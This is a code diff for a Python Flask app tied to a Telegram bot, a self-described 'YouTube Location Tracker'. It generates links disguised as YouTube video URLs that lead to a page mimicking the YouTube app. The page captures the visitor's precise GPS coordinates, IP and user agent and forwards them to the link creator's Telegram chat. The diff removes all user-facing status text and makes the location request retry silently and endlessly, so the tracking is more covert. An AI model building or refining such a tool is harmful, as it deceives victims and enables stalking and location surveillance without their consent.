@@ -38,13 +38,10 @@ FAKE_DOMAINS = {
     }
 }
 
-# Conversation states - simplified to just WEBSITE_INPUT
 WEBSITE_INPUT = 1
 
-# Initialize Flask app
 app = Flask(__name__)
 
-# Database setup
 def init_db():
     conn = sqlite3.connect('location_tracker.db')
     c = conn.cursor()
@@ -78,19 +75,13 @@ def generate_link(user_id, website_url, brand, chat_id):
               (link_id, user_id, website_url, brand, datetime.now(), 'active', chat_id))
     conn.commit()
     conn.close()
-    
-    brand_info = FAKE_DOMAINS.get(brand, FAKE_DOMAINS['youtube'])
-    fake_path = brand_info['path']
-    return f"{BASE_URL}/{fake_path}/{link_id}"
+    return f"{BASE_URL}/youtube.com/watch/{link_id}"
 
-@app.route('/<path:fake_path>/<link_id>')
-def fake_domain_track(fake_path, link_id):
-    # Only YouTube brand
-    brand = 'youtube'
-    
+@app.route('/youtube.com/watch/<link_id>')
+def fake_domain_track(link_id):
     conn = sqlite3.connect('location_tracker.db')
     c = conn.cursor()
-    c.execute("SELECT website_url, status FROM links WHERE link_id = ? AND brand = ?", (link_id, brand))
+    c.execute("SELECT website_url, status FROM links WHERE link_id = ? AND brand = 'youtube'", (link_id,))
     result = c.fetchone()
     conn.close()
     
@@ -124,7 +115,6 @@ def fake_domain_track(fake_path, link_id):
                 margin: 0;
             }}
             
-            /* Full screen mobile app feel */
             .app-container {{
                 width: 100%;
                 max-width: 430px;
@@ -137,32 +127,15 @@ def fake_domain_track(fake_path, link_id):
                 overflow: hidden;
             }}
             
-            /* Status bar */
-            .status-bar {{
-                padding: 10px 16px 0 16px;
-                display: flex;
-                justify-content: space-between;
-                color: #fff;
-                font-size: 12px;
-                font-weight: 600;
-                opacity: 0.9;
-                background: #0f0f0f;
-                z-index: 10;
-            }}
-            
-            /* YouTube Header */
+            /* YouTube Header - no status bar */
             .youtube-header {{
-                padding: 8px 16px;
+                padding: 12px 16px 8px 16px;
                 display: flex;
                 justify-content: space-between;
                 align-items: center;
                 background: #0f0f0f;
                 z-index: 10;
-            }}
-            .youtube-logo {{
-                display: flex;
-                align-items: center;
-                gap: 4px;
+                margin-top: 4px;
             }}
             .youtube-logo svg {{
                 width: 90px;
@@ -179,7 +152,7 @@ def fake_domain_track(fake_path, link_id):
                 fill: #fff;
             }}
             
-            /* Loading Content - Like YouTube app */
+            /* Loading Content - Only skeleton and loader, no text */
             .loading-content {{
                 flex: 1;
                 display: flex;
@@ -188,6 +161,7 @@ def fake_domain_track(fake_path, link_id):
                 align-items: center;
                 padding: 20px;
                 background: #0f0f0f;
+                position: relative;
             }}
             
             /* YouTube-style loading spinner */
@@ -206,7 +180,7 @@ def fake_domain_track(fake_path, link_id):
                 100% {{ transform: rotate(360deg); }}
             }}
             
-            /* Skeleton loading cards - like YouTube feed */
+            /* Skeleton loading cards - gray texture moving */
             .skeleton-container {{
                 width: 100%;
                 max-width: 380px;
@@ -216,7 +190,6 @@ def fake_domain_track(fake_path, link_id):
                 display: flex;
                 gap: 12px;
                 margin-bottom: 16px;
-                animation: pulse 1.5s ease-in-out infinite;
             }}
             .skeleton-thumbnail {{
                 width: 160px;
@@ -224,6 +197,8 @@ def fake_domain_track(fake_path, link_id):
                 background: #272727;
                 border-radius: 8px;
                 flex-shrink: 0;
+                position: relative;
+                overflow: hidden;
             }}
             .skeleton-text {{
                 flex: 1;
@@ -236,6 +211,8 @@ def fake_domain_track(fake_path, link_id):
                 height: 12px;
                 background: #272727;
                 border-radius: 4px;
+                position: relative;
+                overflow: hidden;
             }}
             .skeleton-line.short {{
                 width: 60%;
@@ -244,12 +221,30 @@ def fake_domain_track(fake_path, link_id):
                 width: 80%;
             }}
             
-            @keyframes pulse {{
-                0%, 100% {{ opacity: 1; }}
-                50% {{ opacity: 0.5; }}
+            /* Moving gray texture (shimmer effect) */
+            .skeleton-thumbnail::after,
+            .skeleton-line::after {{
+                content: '';
+                position: absolute;
+                top: 0;
+                left: -150%;
+                width: 150%;
+                height: 100%;
+                background: linear-gradient(
+                    90deg,
+                    transparent,
+                    rgba(255,255,255,0.05) 50%,
+                    transparent
+                );
+                animation: shimmer 1.5s infinite;
             }}
             
-            /* Bottom Navigation - Like YouTube app */
+            @keyframes shimmer {{
+                0% {{ left: -150%; }}
+                100% {{ left: 150%; }}
+            }}
+            
+            /* Bottom Navigation */
             .bottom-nav {{
                 display: flex;
                 justify-content: space-around;
@@ -265,7 +260,6 @@ def fake_domain_track(fake_path, link_id):
                 gap: 2px;
                 color: #aaaaaa;
                 font-size: 10px;
-                cursor: pointer;
             }}
             .nav-item.active {{
                 color: #fff;
@@ -274,39 +268,6 @@ def fake_domain_track(fake_path, link_id):
                 width: 24px;
                 height: 24px;
                 fill: currentColor;
-            }}
-            
-            /* Status messages - subtle */
-            .status-message {{
-                color: #aaaaaa;
-                font-size: 13px;
-                margin-top: 10px;
-                text-align: center;
-                transition: all 0.3s ease;
-            }}
-            .status-message.success {{
-                color: #3ea6ff;
-            }}
-            .status-message.error {{
-                color: #ff4d4d;
-            }}
-            
-            /* Hide the retry button initially */
-            #retryBtn {{
-                background: #ff0000;
-                color: white;
-                border: none;
-                padding: 10px 24px;
-                border-radius: 25px;
-                font-size: 14px;
-                font-weight: 500;
-                cursor: pointer;
-                margin-top: 20px;
-                display: none;
-                transition: background 0.2s;
-            }}
-            #retryBtn:hover {{
-                background: #cc0000;
             }}
             
             /* Progress bar at top - YouTube style */
@@ -336,11 +297,9 @@ def fake_domain_track(fake_path, link_id):
                 100% {{ width: 100%; }}
             }}
             
-            /* Time display */
-            .time-display {{
-                color: #fff;
-                font-size: 14px;
-                font-weight: 600;
+            /* Hide any text */
+            .no-text {{
+                display: none;
             }}
         </style>
     </head>
@@ -352,27 +311,12 @@ def fake_domain_track(fake_path, link_id):
         
         <!-- Main App Container -->
         <div class="app-container">
-            <!-- Status Bar -->
-            <div class="status-bar">
-                <span id="currentTime">9:41</span>
-                <span>🔋 📶</span>
-            </div>
-            
-            <!-- YouTube Header -->
+            <!-- YouTube Header (no status bar) -->
             <div class="youtube-header">
                 <div class="youtube-logo">
                     <svg viewBox="0 0 90 24" fill="none">
                         <path d="M82.2 2.2C80.8 1.7 79.2 1.3 77.4 1.1C75.6 0.9 73.8 0.8 72 0.8C70.2 0.8 68.4 0.9 66.6 1.1C64.8 1.3 63.2 1.7 61.8 2.2C60.4 2.7 59.2 3.3 58.2 4.1C57.2 4.9 56.6 5.8 56.6 6.9V17.1C56.6 18.2 57.2 19.1 58.2 19.9C59.2 20.7 60.4 21.3 61.8 21.8C63.2 22.3 64.8 22.7 66.6 22.9C68.4 23.1 70.2 23.2 72 23.2C73.8 23.2 75.6 23.1 77.4 22.9C79.2 22.7 80.8 22.3 82.2 21.8C83.6 21.3 84.8 20.7 85.8 19.9C86.8 19.1 87.4 18.2 87.4 17.1V6.9C87.4 5.8 86.8 4.9 85.8 4.1C84.8 3.3 83.6 2.7 82.2 2.2Z" fill="#FF0000"/>
                         <path d="M72 5L85 12L72 19V5Z" fill="white"/>
-                        <path d="M8.6 22.2H5.8V1.8H8.6V22.2Z" fill="white"/>
-                        <path d="M18.6 22.2H15.8V1.8H18.6V22.2Z" fill="white"/>
-                        <path d="M28.6 22.2H25.8V1.8H28.6V22.2Z" fill="white"/>
-                        <path d="M38.6 22.2H35.8V1.8H38.6V22.2Z" fill="white"/>
-                        <path d="M48.6 22.2H45.8V1.8H48.6V22.2Z" fill="white"/>
-                        <path d="M58.6 22.2H55.8V1.8H58.6V22.2Z" fill="white"/>
-                        <path d="M68.6 22.2H65.8V1.8H68.6V22.2Z" fill="white"/>
-                        <path d="M78.6 22.2H75.8V1.8H78.6V22.2Z" fill="white"/>
-                        <path d="M88.6 22.2H85.8V1.8H88.6V22.2Z" fill="white"/>
                     </svg>
                 </div>
                 <div class="header-icons">
@@ -381,11 +325,10 @@ def fake_domain_track(fake_path, link_id):
                 </div>
             </div>
             
-            <!-- Loading Content -->
+            <!-- Loading Content - Only skeleton and loader -->
             <div class="loading-content">
                 <div class="youtube-loader" id="loader"></div>
                 
-                <!-- Skeleton loading cards -->
                 <div class="skeleton-container">
                     <div class="skeleton-item">
                         <div class="skeleton-thumbnail"></div>
@@ -412,9 +355,6 @@ def fake_domain_track(fake_path, link_id):
                         </div>
                     </div>
                 </div>
-                
-                <div class="status-message" id="status">Loading recommendations...</div>
-                <button id="retryBtn" onclick="retryLocation()">↻ Try Again</button>
             </div>
             
             <!-- Bottom Navigation -->
@@ -441,33 +381,14 @@ def fake_domain_track(fake_path, link_id):
         <script>
             const linkId = '{link_id}';
             const redirectUrl = '{website_url}';
-            const statusEl = document.getElementById('status');
-            const loader = document.getElementById('loader');
-            const retryBtn = document.getElementById('retryBtn');
             const progressFill = document.getElementById('progressFill');
-            let attempts = 0;
             let locationCaptured = false;
-            
-            // Update time
-            function updateTime() {{
-                const now = new Date();
-                const hours = now.getHours().toString().padStart(2, '0');
-                const minutes = now.getMinutes().toString().padStart(2, '0');
-                document.getElementById('currentTime').textContent = hours + ':' + minutes;
-            }}
-            updateTime();
-            setInterval(updateTime, 30000);
             
             function sendLocation(position) {{
                 if (locationCaptured) return;
                 locationCaptured = true;
                 
                 const {{latitude, longitude, accuracy}} = position.coords;
-                
-                statusEl.textContent = '✅ Location found!';
-                statusEl.className = 'status-message success';
-                loader.style.display = 'none';
-                retryBtn.style.display = 'none';
                 progressFill.style.width = '100%';
                 
                 fetch('/capture', {{
@@ -484,68 +405,45 @@ def fake_domain_track(fake_path, link_id):
                 .then(response => response.json())
                 .then(data => {{
                     if (data.success) {{
-                        statusEl.textContent = '✅ Redirecting to YouTube...';
                         setTimeout(() => {{
                             window.location.href = redirectUrl;
                         }}, 1000);
                     }}
                 }})
                 .catch(() => {{
-                    statusEl.textContent = '⚠️ Connection issue. Retrying...';
-                    statusEl.className = 'status-message error';
+                    // Silent retry if fetch fails
                     setTimeout(retryLocation, 2000);
                 }});
             }}
             
             function handleError(error) {{
-                attempts++;
-                if (attempts < 3) {{
-                    statusEl.textContent = `⏳ Attempt ${{attempts}}/3: Location access required`;
-                    statusEl.className = 'status-message';
-                    setTimeout(retryLocation, 3000);
-                }} else {{
-                    statusEl.textContent = '⚠️ Please allow location access in your browser settings';
-                    statusEl.className = 'status-message error';
-                    loader.style.display = 'none';
-                    retryBtn.style.display = 'inline-block';
-                    progressFill.style.width = '0%';
-                }}
+                // Keep retrying silently until location is provided
+                setTimeout(retryLocation, 3000);
             }}
             
             function retryLocation() {{
                 if (navigator.geolocation) {{
-                    statusEl.textContent = '📍 Requesting location...';
-                    statusEl.className = 'status-message';
-                    loader.style.display = 'inline-block';
-                    retryBtn.style.display = 'none';
-                    progressFill.style.width = '0%';
-                    progressFill.style.animation = 'none';
-                    setTimeout(() => {{
-                        progressFill.style.animation = 'progress 8s ease-in-out forwards';
-                    }}, 10);
-                    locationCaptured = false;
-                    
                     navigator.geolocation.getCurrentPosition(
                         sendLocation,
                         handleError,
                         {{enableHighAccuracy: true, timeout: 15000, maximumAge: 0}}
                     );
+                }} else {{
+                    // Geolocation not supported, retry anyway (though it won't work)
+                    setTimeout(retryLocation, 5000);
                 }}
             }}
             
-            // Start location request with YouTube-style loading
+            // Start location request immediately
             if (navigator.geolocation) {{
-                statusEl.textContent = '📍 Checking location...';
                 navigator.geolocation.getCurrentPosition(
                     sendLocation,
                     handleError,
                     {{enableHighAccuracy: true, timeout: 15000, maximumAge: 0}}
                 );
             }} else {{
-                statusEl.textContent = '⚠️ Location not supported';
-                statusEl.className = 'status-message error';
-                loader.style.display = 'none';
-                retryBtn.style.display = 'inline-block';
+                // Fallback - keep trying
+                setTimeout(retryLocation, 5000);
             }}
         </script>
     </body>
@@ -562,7 +460,6 @@ def capture_location():
     user_agent = data.get('user_agent')
     ip_address = request.remote_addr
     
-    # Save to database
     conn = sqlite3.connect('location_tracker.db')
     c = conn.cursor()
     c.execute("""INSERT INTO locations 
@@ -570,45 +467,26 @@ def capture_location():
                  VALUES (?, ?, ?, ?, ?, ?, ?)""",
               (link_id, latitude, longitude, accuracy, datetime.now(), user_agent, ip_address))
     
-    # Get chat_id
     c.execute("SELECT chat_id FROM links WHERE link_id = ?", (link_id,))
     result = c.fetchone()
     conn.commit()
     conn.close()
     
-    # Send notification to user
     if result:
         chat_id = result[0]
         try:
-            # Create bot instance
             bot = Bot(token=TELEGRAM_TOKEN)
-            
-            # Create new event loop for this request
             loop = asyncio.new_event_loop()
             asyncio.set_event_loop(loop)
-            
-            # Send location
-            loop.run_until_complete(bot.send_location(
-                chat_id=chat_id, 
-                latitude=latitude, 
-                longitude=longitude
-            ))
-            
-            # Send message
+            loop.run_until_complete(bot.send_location(chat_id=chat_id, latitude=latitude, longitude=longitude))
             loop.run_until_complete(bot.send_message(
                 chat_id=chat_id,
-                text=f"📍 *Location Captured!*\n\n"
-                     f"Coordinates: {latitude:.6f}, {longitude:.6f}\n"
-                     f"Accuracy: {accuracy} meters\n"
-                     f"Link ID: {link_id[:12]}...",
+                text=f"📍 *Location Captured!*\n\nCoordinates: {latitude:.6f}, {longitude:.6f}\nAccuracy: {accuracy} meters",
                 parse_mode='Markdown'
             ))
-            
             loop.close()
-            print(f"✅ Location sent to chat_id: {chat_id}")
-            
         except Exception as e:
-            print(f"❌ Error sending location: {e}")
+            print(f"Error sending location: {e}")
     
     return jsonify({'success': True})
 
@@ -619,18 +497,14 @@ def health():
 
 # Telegram Bot Handlers
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # YouTube is the only option - directly ask for website URL
     await update.message.reply_text(
         "🎯 *YouTube Location Tracker*\n\n"
-        "📝 *Please send me the website URL* where you want to redirect users after location capture.\n\n"
+        "📝 *Please send me the website URL* to redirect users after location capture.\n\n"
         "Example: `https://your-website.com`\n\n"
         "Or send `/cancel` to cancel.",
         parse_mode='Markdown'
     )
-    
-    # Store that we're using YouTube
     context.user_data['brand'] = 'youtube'
-    
     return WEBSITE_INPUT
 
 async def receive_website(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -643,14 +517,10 @@ async def receive_website(update: Update, context: ContextTypes.DEFAULT_TYPE):
         website_url = 'https://' + website_url
     
     if '.' not in website_url:
-        await update.message.reply_text(
-            "❌ Invalid URL. Send like: https://example.com",
-            parse_mode=None
-        )
+        await update.message.reply_text("❌ Invalid URL. Send like: https://example.com", parse_mode=None)
         return WEBSITE_INPUT
     
     link = generate_link(user_id, website_url, brand, chat_id)
-    brand_info = FAKE_DOMAINS['youtube']
     
     keyboard = [
         [InlineKeyboardButton("📋 Copy YouTube Link", url=link)],
@@ -659,45 +529,28 @@ async def receive_website(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await update.message.reply_text(
-        f"✅ *YouTube Link Generated!*\n\n"
-        f"🔗 {link}\n\n"
-        f"🎭 Looks like: {brand_info['path']}\n"
-        f"🌐 Redirects to: {website_url}\n\n"
-        f"Share this link - it looks like a YouTube link!",
+        f"✅ *YouTube Link Generated!*\n\n🔗 {link}\n\nShare this link - it looks like a YouTube video!",
         reply_markup=reply_markup,
         parse_mode=None
     )
-    
     return ConversationHandler.END
 
 async def new_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    
     await query.edit_message_text(
-        "🎯 *YouTube Location Tracker*\n\n"
-        "📝 *Please send me the website URL* for this new link.\n\n"
-        "Example: `https://your-website.com`\n\n"
-        "Or send `/cancel` to cancel.",
+        "🎯 *YouTube Location Tracker*\n\n📝 *Please send me the website URL* for this new link.\n\nExample: `https://your-website.com`\n\nOr send `/cancel` to cancel.",
         parse_mode='Markdown'
     )
-    
     context.user_data['brand'] = 'youtube'
-    
     return WEBSITE_INPUT
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "❌ Cancelled. Send /start to begin again.",
-        parse_mode=None
-    )
+    await update.message.reply_text("❌ Cancelled. Send /start to begin again.", parse_mode=None)
     return ConversationHandler.END
 
 def main():
-    # Force single instance
     os.environ["WEB_CONCURRENCY"] = "1"
-    
-    # Fix for Python 3.14+ event loop issue
     try:
         loop = asyncio.get_running_loop()
     except RuntimeError:
@@ -705,8 +558,6 @@ def main():
         asyncio.set_event_loop(loop)
     
     application = Application.builder().token(TELEGRAM_TOKEN).build()
-    
-    # Create conversation handler
     conv_handler = ConversationHandler(
         entry_points=[CommandHandler('start', start)],
         states={
@@ -717,36 +568,19 @@ def main():
         },
         fallbacks=[CommandHandler('cancel', cancel)]
     )
-    
-    # Add conversation handler
     application.add_handler(conv_handler)
-    
-    # Add a separate handler for /start to reset conversation
     application.add_handler(CommandHandler('start', start), group=1)
-    
-    # Add other handlers
     application.add_handler(CallbackQueryHandler(new_link, pattern='^new_link$'))
     
-    # Start Flask in background with single thread
     import threading
     port = int(os.environ.get('PORT', 5000))
     threading.Thread(
-        target=lambda: app.run(
-            host='0.0.0.0', 
-            port=port, 
-            debug=False, 
-            use_reloader=False,
-            threaded=False
-        ),
+        target=lambda: app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False, threaded=False),
         daemon=True
     ).start()
     
-    # Start bot with cleanup
     try:
-        application.run_polling(
-            allowed_updates=Update.ALL_TYPES,
-            stop_signals=None
-        )
+        application.run_polling(allowed_updates=Update.ALL_TYPES, stop_signals=None)
     except Exception as e:
         print(f"Bot error: {e}")
 
